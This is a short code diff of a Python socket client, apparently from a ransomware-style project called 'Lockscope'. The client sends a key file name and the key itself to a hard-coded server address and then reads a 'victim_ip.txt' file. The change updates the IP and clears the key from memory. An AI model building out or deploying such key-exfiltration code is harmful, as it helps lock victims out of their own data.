@@ -5,7 +5,7 @@ import os
 
 def client(key):
     
-    IP = '192.168.1.131'
+    IP = '192.168.1.137'
     PORT = 8080
     ADDR = (IP, PORT)
 
@@ -21,7 +21,9 @@ def client(key):
     client.send("key.pkl".encode())
     time.sleep(2)
     client.send(key)
-
+    
+    key = None
+    
     time.sleep(2)
 
     with open(r"C:\Users\User\Desktop\Lockscope\Fase 3\victim_ip.txt", "rb") as f:
